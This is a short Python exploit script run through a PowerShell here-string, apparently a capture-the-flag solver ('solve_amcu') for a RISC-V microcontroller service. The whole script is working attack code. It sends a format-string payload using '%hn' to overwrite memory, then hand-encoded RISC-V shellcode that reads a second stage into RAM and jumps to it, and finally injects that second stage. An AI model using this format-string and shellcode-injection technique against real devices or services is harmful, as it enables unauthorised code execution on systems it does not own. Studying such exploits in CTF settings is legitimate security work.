$ @'
    import time
    from solve_amcu import connect, recv_until


    def addi(rd,rs1,imm): return ((imm&0xfff)<<20)|(rs1<<15)|(rd<<7)|0x13
    def jalr(rd,rs1,imm=0): return ((imm&0xfff)<<20)|(rs1<<15)|(rd<<7)|0x67
    def lui(rd,imm20): return (imm20<<12)|(rd<<7)|0x37
    fmt=b'%41013c%x%x%x%x%x%hn'
    stage1=b''.join(x.to_bytes(4,'little') for x in [
        lui(11,0x20000), addi(11,11,0x140), addi(12,0,0x200), addi(15,0,0x518), jalr(1,15),
        lui(15,0x20000), addi(15,15,0x140), jalr(0,15)
    ])
    payload=fmt+b'\0'+b'A'*(0x18-len(fmt)-1)+stage1
    payload+=b' '*(63-len(payload))
    inst=[]
    for ch in b'OK\n': inst += [addi(15,0,0x3f4), addi(10,0,ch), jalr(1,15)]
    stage2=b''.join(x.to_bytes(4,'little') for x in inst)+bytes.fromhex('01a0')
    s=connect(); s.sendall(payload); out=recv_until(s,b'< ',timeout=20);
    print('tail',out[-60:].decode('latin1','replace'))
    s.sendall(b'exit\n')
    time.sleep(0.5)
    s.sendall(stage2)
    s.settimeout(10); data=b''
    try:
     while True:
      d=s.recv(4096)
      if not d: break
      data+=d
      if b'OK\n' in data or b'HardFault' in data or b'Type `exit' in data: break
    except Exception as e: print('recv',repr(e))
    print(data.decode('latin1','replace'))
    s.close()
    '@ | python -